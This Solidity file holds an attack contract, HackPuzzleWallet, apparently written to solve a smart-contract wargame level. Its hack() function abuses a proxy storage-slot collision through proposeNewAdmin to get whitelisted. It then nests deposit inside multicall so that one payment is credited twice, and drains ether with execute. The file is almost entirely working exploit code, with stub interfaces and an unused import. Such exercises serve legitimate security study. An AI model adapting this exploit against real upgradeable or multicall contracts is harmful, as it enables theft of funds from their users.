// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
pragma experimental ABIEncoderV2;


contract HackPuzzleWallet {
    PuzzleProxy proxyInst;
    PuzzleWallet puzzleInst;

    constructor (address _puzzleWallet) {
        proxyInst = PuzzleProxy(_puzzleWallet);
        puzzleInst = PuzzleWallet(_puzzleWallet);
    }

    function hack() public payable {

        proxyInst.proposeNewAdmin(address(this));
        puzzleInst.addToWhitelist(address(this));

        bytes[] memory fullArray = new bytes[](2);
        bytes[] memory depositDataArray = new bytes[](1);
        depositDataArray[0] = abi.encodeWithSelector(puzzleInst.deposit.selector);

        fullArray[0] = depositDataArray[0];
        fullArray[1] = abi.encodeWithSelector(puzzleInst.multicall.selector, depositDataArray);

        puzzleInst.multicall{value: .001 ether}(fullArray);
        puzzleInst.execute(address(this), 0.002 ether, "");
    }

    receive() external payable {}
}

contract PuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external {}
    function deposit() external payable {}
    function multicall(bytes[] calldata data) external payable {}
    function execute(address to, uint256 value, bytes calldata data) external payable {}
    function setMaxBalance(uint256 _maxBalance) external {}
    function addToWhitelist(address addr) external {}
}

contract PuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external {}
}